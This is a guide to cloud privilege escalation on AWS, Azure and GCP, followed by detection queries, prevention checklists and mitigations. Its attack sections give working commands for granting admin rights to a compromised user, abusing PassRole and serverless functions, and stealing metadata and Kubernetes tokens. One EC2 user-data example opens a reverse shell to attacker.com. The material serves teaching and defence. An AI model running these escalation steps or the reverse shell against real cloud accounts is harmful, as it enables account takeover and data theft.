Cloud Privilege Escalation Attacks: A Comprehensive Guide

Table of Contents

What is Privilege Escalation?
Cloud vs Traditional Privilege Escalation
AWS Privilege Escalation
Azure Privilege Escalation
GCP Privilege Escalation
Common Attack Vectors
Real-World Attack Scenarios
Detection and Prevention
Mitigation Strategies
What is Privilege Escalation?

Privilege Escalation is when an attacker gains higher-level permissions than originally granted, allowing them to:

Access sensitive data
Modify critical resources
Create backdoors
Take over entire cloud accounts
Types of Privilege Escalation

Vertical Escalation: Moving from low privileges → high privileges

User → Administrator
Limited IAM role → Admin role
Horizontal Escalation: Accessing resources of another user at the same privilege level

User A → User B's resources
Service A → Service B's credentials
Cloud vs Traditional Privilege Escalation

Traditional (On-Premises)

Attacker exploits:
├── OS vulnerabilities
├── Misconfigured file permissions
├── Weak passwords
└── Kernel exploits
Cloud Environment

Attacker exploits:
├── IAM misconfigurations
├── Over-permissive policies
├── Exposed credentials
├── Service-to-service trust relationships
└── API misuse
Key Difference: In the cloud, privilege escalation often happens through identity and access management (IAM) misconfigurations rather than traditional OS exploits.

AWS Privilege Escalation

Attack Flow Overview

1. Initial Access (Compromised Credentials)
   ↓
2. Reconnaissance (Enumerate permissions)
   ↓
3. Identify Privilege Escalation Path
   ↓
4. Exploit Misconfiguration
   ↓
5. Gain Administrative Access
Method 1: IAM Policy Modification

Scenario: User has iam:PutUserPolicy permission

Step 1: Attacker Gets Initial Access

# Attacker compromises AWS credentials (phishing, exposed keys, etc.)
export AWS_ACCESS_KEY_ID=AKIA...
export AWS_SECRET_ACCESS_KEY=...
Step 2: Enumerate Current Permissions

# Check what the current user can do
aws iam get-user
aws iam list-attached-user-policies --user-name compromised-user
aws iam list-user-policies --user-name compromised-user
Step 3: Attach Admin Policy to Self

# If user has iam:PutUserPolicy or iam:AttachUserPolicy permission
aws iam put-user-policy \
  --user-name compromised-user \
  --policy-name AdminAccess \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }]
  }'
Result: Attacker now has full administrative access! 💥

Method 2: AssumeRole Privilege Escalation

Scenario: User can assume a more privileged role

Vulnerable Setup

// Overly permissive trust policy on AdminRole
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {
      "AWS": "arn:aws:iam::123456789012:root"  // ⚠️ Allows ANY user in account
    },
    "Action": "sts:AssumeRole"
  }]
}
Attack Execution

# Step 1: Discover assumable roles
aws iam list-roles

# Step 2: Assume the privileged role
aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/AdminRole \
  --role-session-name attacker-session

# Step 3: Use temporary credentials
export AWS_ACCESS_KEY_ID=<temporary-key>
export AWS_SECRET_ACCESS_KEY=<temporary-secret>
export AWS_SESSION_TOKEN=<session-token>

# Step 4: Now operate as admin
aws s3 ls  # Access all S3 buckets
aws ec2 describe-instances  # See all EC2 instances
Method 3: Lambda Function Privilege Escalation

Scenario: User can create/update Lambda functions

Attack Steps

# Step 1: Create malicious Lambda function
cat > escalate.py << 'EOF'
import boto3

def lambda_handler(event, context):
    iam = boto3.client('iam')
    
    # Attach admin policy to attacker's user
    iam.attach_user_policy(
        UserName='compromised-user',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    
    return {'statusCode': 200, 'body': 'Escalated!'}
EOF

# Step 2: Create Lambda with admin role
aws lambda create-function \
  --function-name EscalatePrivileges \
  --runtime python3.9 \
  --role arn:aws:iam::123456789012:role/LambdaAdminRole \
  --handler escalate.lambda_handler \
  --zip-file fileb://function.zip

# Step 3: Invoke the function
aws lambda invoke \
  --function-name EscalatePrivileges \
  output.txt

# Step 4: Now have admin access
aws iam list-users
Why This Works: Lambda functions often have powerful IAM roles for legitimate operations.

Method 4: EC2 Instance Profile Theft

Scenario: Attacker gains access to EC2 instance

Attack Flow

# Step 1: SSH into compromised EC2 instance
ssh ec2-user@compromised-instance

# Step 2: Access instance metadata service
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Returns: EC2-Admin-Role

# Step 3: Steal temporary credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Admin-Role

# Returns:
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2024-02-21T12:00:00Z"
}

# Step 4: Use stolen credentials from attacker's machine
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# Step 5: Operate with EC2 instance's permissions
aws s3 ls
aws dynamodb list-tables
Method 5: PassRole Exploitation

Scenario: User has iam:PassRole permission

Vulnerable Permission

{
  "Effect": "Allow",
  "Action": [
    "iam:PassRole",
    "ec2:RunInstances"
  ],
  "Resource": "*"
}
Attack Execution

# Step 1: Launch EC2 with privileged role
aws ec2 run-instances \
  --image-id ami-12345678 \
  --instance-type t2.micro \
  --iam-instance-profile Name=AdminInstanceProfile \
  --user-data '#!/bin/bash
    # Install reverse shell
    bash -i >& /dev/tcp/attacker.com/4444 0>&1'

# Step 2: SSH into instance and steal credentials from metadata
ssh ec2-user@<new-instance-ip>
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole
Azure Privilege Escalation

Method 1: Service Principal Abuse

Attack Scenario

# Step 1: Compromised service principal credentials
export AZURE_CLIENT_ID=<app-id>
export AZURE_CLIENT_SECRET=<secret>
export AZURE_TENANT_ID=<tenant>

# Step 2: Login
az login --service-principal \
  -u $AZURE_CLIENT_ID \
  -p $AZURE_CLIENT_SECRET \
  --tenant $AZURE_TENANT_ID

# Step 3: Check current permissions
az role assignment list --assignee $AZURE_CLIENT_ID

# Step 4: If service principal has "User Access Administrator" role
az role assignment create \
  --assignee attacker@victim.com \
  --role "Owner" \
  --scope /subscriptions/<subscription-id>
Method 2: Managed Identity Exploitation

Scenario: Attacker gains access to Azure VM

# Step 1: From compromised VM, access metadata endpoint
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' \
  -H Metadata:true

# Returns OAuth token for VM's managed identity

# Step 2: Use token to access Azure resources
export TOKEN=<access-token>

curl -X GET \
  -H "Authorization: Bearer $TOKEN" \
  https://management.azure.com/subscriptions/<subscription-id>/resourceGroups?api-version=2021-04-01
Method 3: Azure AD Application Permissions

Attack Steps

# Step 1: Application has excessive permissions
# Example: Application has "RoleManagement.ReadWrite.Directory"

# Step 2: Use application credentials
az login --service-principal -u <app-id> -p <secret> --tenant <tenant>

# Step 3: Grant self Global Administrator
az ad sp update --id <attacker-service-principal> \
  --add-approle-assignment \
  --role-id 62e90394-69f5-4237-9190-012177145e10  # Global Admin role ID
GCP Privilege Escalation

Method 1: Service Account Key Exploitation

# Step 1: Compromised service account key (JSON file)
export GOOGLE_APPLICATION_CREDENTIALS=/path/to/key.json

# Step 2: Authenticate
gcloud auth activate-service-account --key-file=$GOOGLE_APPLICATION_CREDENTIALS

# Step 3: Check permissions
gcloud projects get-iam-policy <project-id>

# Step 4: If service account can grant IAM roles
gcloud projects add-iam-policy-binding <project-id> \
  --member=user:attacker@gmail.com \
  --role=roles/owner
Method 2: Compute Engine Metadata Abuse

# Step 1: From compromised GCE instance
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"

# Returns OAuth token

# Step 2: Use token to access GCP APIs
export TOKEN=<access-token>

curl -H "Authorization: Bearer $TOKEN" \
  https://cloudresourcemanager.googleapis.com/v1/projects/<project-id>
Method 3: Cloud Function Privilege Escalation

# Step 1: User has cloudfunctions.functions.create permission
# Step 2: Deploy malicious function with high-privilege service account

cat > main.py << 'EOF'
import subprocess

def escalate(request):
    # Grant attacker owner role
    subprocess.call([
        'gcloud', 'projects', 'add-iam-policy-binding', 
        'PROJECT_ID',
        '--member=user:attacker@gmail.com',
        '--role=roles/owner'
    ])
    return 'Escalated!'
EOF

gcloud functions deploy escalate \
  --runtime python39 \
  --trigger-http \
  --service-account=high-privilege-sa@project.iam.gserviceaccount.com

# Step 3: Trigger function
curl https://REGION-PROJECT_ID.cloudfunctions.net/escalate
Common Attack Vectors

1. Overly Permissive IAM Policies

// ❌ BAD: Wildcard permissions
{
  "Effect": "Allow",
  "Action": "*",
  "Resource": "*"
}

// ✅ GOOD: Specific permissions
{
  "Effect": "Allow",
  "Action": [
    "s3:GetObject",
    "s3:PutObject"
  ],
  "Resource": "arn:aws:s3:::specific-bucket/*"
}
2. Exposed Credentials

Common Places Credentials Leak:

├── GitHub repositories (.env files, hardcoded keys)
├── Docker images (embedded secrets)
├── CI/CD logs (printed credentials)
├── CloudFormation/Terraform state files
├── Application logs
├── Public S3 buckets
└── Developer workstations
3. Metadata Service Exploitation

All major cloud providers expose metadata endpoints:

Provider	Metadata Endpoint
AWS	http://169.254.169.254/latest/meta-data/
Azure	http://169.254.169.254/metadata/
GCP	http://metadata.google.internal/
Attack: SSRF vulnerability → Access metadata → Steal credentials

4. Trust Relationship Abuse

Cross-Account Access

// Overly permissive trust policy
{
  "Principal": {
    "AWS": "*"  // ⚠️ Allows ANY AWS account!
  }
}

// Should be:
{
  "Principal": {
    "AWS": "arn:aws:iam::123456789012:root"  // Specific account only
  }
}
Real-World Attack Scenarios

Scenario 1: Capital One Data Breach (2019)

Attack Flow:

1. SSRF vulnerability in web application
   ↓
2. Attacker accessed EC2 metadata endpoint
   ↓
3. Stole IAM credentials from instance profile
   ↓
4. Used credentials to access S3 buckets
   ↓
5. Exfiltrated 100 million customer records
Root Cause:

Overly permissive IAM role
WAF (Web Application Firewall) misconfiguration
No egress filtering
Scenario 2: The S3 Bucket Permission Escalation

# Step 1: Attacker finds public S3 bucket
aws s3 ls s3://company-backups --no-sign-request

# Step 2: Downloads backup files containing credentials
aws s3 cp s3://company-backups/database-backup.sql . --no-sign-request

# Step 3: Extracts AWS credentials from backup
grep -i "aws_access_key" database-backup.sql

# Step 4: Uses credentials to access production environment
export AWS_ACCESS_KEY_ID=<found-key>
export AWS_SECRET_ACCESS_KEY=<found-secret>

# Step 5: Escalates privileges
aws iam attach-user-policy --user-name backup-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
Scenario 3: Kubernetes ServiceAccount Token Theft

# Step 1: Compromise pod in Kubernetes cluster
kubectl exec -it compromised-pod -- /bin/bash

# Step 2: Read ServiceAccount token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Step 3: Use token to access Kubernetes API
export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

curl -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets

# Step 4: Extract cloud provider credentials from secrets
kubectl get secrets -n kube-system
Detection and Prevention

Detection Strategies

1. Monitor IAM Policy Changes

# AWS CloudTrail events to monitor:
- PutUserPolicy
- AttachUserPolicy
- AttachRolePolicy
- CreateAccessKey
- UpdateAssumeRolePolicy
- PassRole
2. Track Unusual API Calls

- Multiple failed API calls (reconnaissance)
- API calls from unusual locations
- Credential usage from multiple IPs
- Calls to iam:List*, iam:Get* (enumeration)
3. Enable Cloud Security Tools

AWS:

AWS GuardDuty (threat detection)
AWS CloudTrail (audit logs)
AWS Config (compliance monitoring)
IAM Access Analyzer
Azure:

Azure Security Center
Azure Sentinel
Azure Policy
Azure Monitor
GCP:

Security Command Center
Cloud Audit Logs
VPC Flow Logs
Policy Intelligence
Prevention Best Practices

1. Principle of Least Privilege

// Only grant minimum required permissions
{
  "Effect": "Allow",
  "Action": [
    "s3:GetObject"
  ],
  "Resource": "arn:aws:s3:::specific-bucket/specific-path/*"
}
2. Use Permission Boundaries

{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": [
      "s3:*",
      "ec2:*"
    ],
    "Resource": "*",
    "Condition": {
      "StringEquals": {
        "aws:RequestedRegion": "us-east-1"
      }
    }
  }]
}
3. Implement MFA for Sensitive Operations

{
  "Condition": {
    "Bool": {
      "aws:MultiFactorAuthPresent": "true"
    }
  }
}
4. Regular Permission Audits

# AWS IAM Access Analyzer
aws accessanalyzer list-findings

# Find unused permissions
aws iam generate-service-last-accessed-details --arn <user-arn>
5. Secure Metadata Service

AWS - IMDSv2 (requires token):

# Enable IMDSv2 on EC2 instance
aws ec2 modify-instance-metadata-options \
  --instance-id i-1234567890abcdef0 \
  --http-tokens required \
  --http-put-response-hop-limit 1
Azure - Disable if not needed:

az vm update \
  --resource-group myResourceGroup \
  --name myVM \
  --set identity.type='None'
Mitigation Strategies

1. Implement Zero Trust Architecture

Principles:
├── Verify explicitly (always authenticate & authorize)
├── Use least privilege access
├── Assume breach (segment access)
└── Monitor everything
2. Use Temporary Credentials

# AWS STS AssumeRole with session duration limit
aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/LimitedRole \
  --role-session-name session1 \
  --duration-seconds 3600  # 1 hour max
3. Network Segmentation

┌─────────────────────────────────┐
│  Internet-Facing Resources      │
│  (DMZ)                          │
└──────────┬──────────────────────┘
           │
┌──────────▼──────────────────────┐
│  Application Tier               │
│  (Private Subnet)               │
└──────────┬──────────────────────┘
           │
┌──────────▼──────────────────────┐
│  Database Tier                  │
│  (Isolated Subnet)              │
└─────────────────────────────────┘
4. Implement SIEM & Alerting

# Example CloudWatch alert for privilege escalation
aws cloudwatch put-metric-alarm \
  --alarm-name IAM-Policy-Change \
  --alarm-description "Alert on IAM policy modifications" \
  --metric-name IAMPolicyChange \
  --namespace AWS/CloudTrail \
  --statistic Sum \
  --period 300 \
  --threshold 1 \
  --comparison-operator GreaterThanThreshold
Security Checklist

AWS Security Checklist

 Enable CloudTrail in all regions
 Use IAM roles instead of long-term credentials
 Implement MFA for privileged accounts
 Enable GuardDuty
 Use AWS Organizations with SCPs
 Rotate access keys regularly
 Enable IMDSv2 on EC2 instances
 Use VPC endpoints for AWS services
 Implement least privilege IAM policies
 Enable S3 Block Public Access
Azure Security Checklist

 Enable Azure AD Conditional Access
 Use managed identities
 Enable Microsoft Defender for Cloud
 Implement Azure Policy
 Enable Activity Log monitoring
 Use Azure Key Vault for secrets
 Implement network security groups
 Enable Just-In-Time VM access
 Use privileged identity management
 Regular access reviews
GCP Security Checklist

 Enable Cloud Audit Logs
 Use service accounts with minimal permissions
 Enable Security Command Center
 Implement VPC Service Controls
 Use workload identity for GKE
 Enable OS Login for compute instances
 Implement organization policies
 Use Secret Manager
 Enable Binary Authorization
 Regular IAM policy reviews
Quick Reference: Detection Queries

AWS CloudTrail - Suspicious Activity

-- Find users attaching admin policies
SELECT userIdentity.principalId, eventName, requestParameters
FROM cloudtrail_logs
WHERE eventName IN ('AttachUserPolicy', 'AttachRolePolicy', 'PutUserPolicy')
  AND requestParameters LIKE '%AdministratorAccess%'
Azure Log Analytics

// Detect role assignment changes
AzureActivity
| where OperationName == "Create role assignment"
| where ActivityStatus == "Succeeded"
| project TimeGenerated, Caller, ResourceGroup, Properties
GCP Cloud Logging

// Find IAM permission grants
resource.type="project"
protoPayload.methodName="SetIamPolicy"
protoPayload.serviceData.policyDelta.bindingDeltas.action="ADD"
Conclusion

Cloud privilege escalation attacks exploit:

Misconfigurations in IAM policies
Overly permissive roles and permissions
Weak credential management
Insufficient monitoring and detection
Key Takeaways:

Always implement least privilege
Monitor and audit regularly
Use temporary credentials
Enable cloud-native security tools
Assume breach and segment access
Remember: In cloud security, the blast radius of a single misconfiguration can be massive. Defense in depth is critical!
